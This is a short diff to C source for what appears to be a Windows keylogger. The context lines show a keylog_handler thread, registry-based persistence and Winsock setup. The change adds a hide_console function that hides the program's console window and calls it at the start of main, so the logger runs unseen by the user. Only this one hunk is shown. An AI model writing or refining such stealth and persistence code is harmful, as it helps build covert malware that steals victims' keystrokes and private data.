@@ -78,7 +78,14 @@ DWORD WINAPI keylog_handler(LPVOID lpParameter) {
   return 0;
 }
 
+static void hide_console(void) {
+	HWND console = GetConsoleWindow();
+	ShowWindow(console, SW_MINIMIZE);
+	ShowWindow(console, SW_HIDE);
+}
+
 int main() {
+  hide_console();
   install_to_registry(PROGRAM_NAME);
   WSADATA wsa;
   if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
